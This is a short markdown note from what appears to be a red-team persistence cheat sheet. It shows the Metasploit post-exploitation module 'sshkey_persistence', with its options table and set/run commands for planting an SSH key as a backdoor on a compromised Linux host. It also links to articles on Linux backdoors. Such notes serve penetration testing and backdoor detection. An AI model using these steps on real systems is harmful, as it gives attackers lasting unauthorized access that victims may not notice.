# Remote Login

## 01 - SSH

### 1.1 - Unix Shell

### 1.2 - Metasploit

```
msf > use post/linux/manage/sshkey_persistence

msf post(linux/manage/sshkey_persistence) > options

Module options (post/linux/manage/sshkey_persistence):

   Name             Current Setting       Required  Description
   ----             ---------------       --------  -----------
   CREATESSHFOLDER  false                 yes       If no .ssh folder is found, create it for a user
   PUBKEY                                 no        Public Key File to use. (Default: Create a new one)
   SESSION                                yes       The session to run this module on
   SSHD_CONFIG      /etc/ssh/sshd_config  yes       sshd_config file
   USERNAME                               no        User to add SSH key to (Default: all users on box)

msf post(linux/manage/sshkey_persistence) > set createsshfolder <true | false>

msf post(linux/manage/sshkey_persistence) > set pubkey [/path/to/file.pub]

msf post(linux/manage/sshkey_persistence) > set sshd_config </path/to/sshd_config>

msf post(linux/manage/sshkey_persistence) > set username <username>

msf post(linux/manage/sshkey_persistence) > set session <session_id>

msf post(linux/manage/sshkey_persistence) > run
```

## References

- [Linux Backdoors and Where to Find Them](https://fahmifj.github.io/blog/linux-backdoors-and-where-to-find-them/)

- [Linode: Linux Red Team Persistence Techniques](https://www.linode.com/docs/guides/linux-red-team-persistence-techniques/)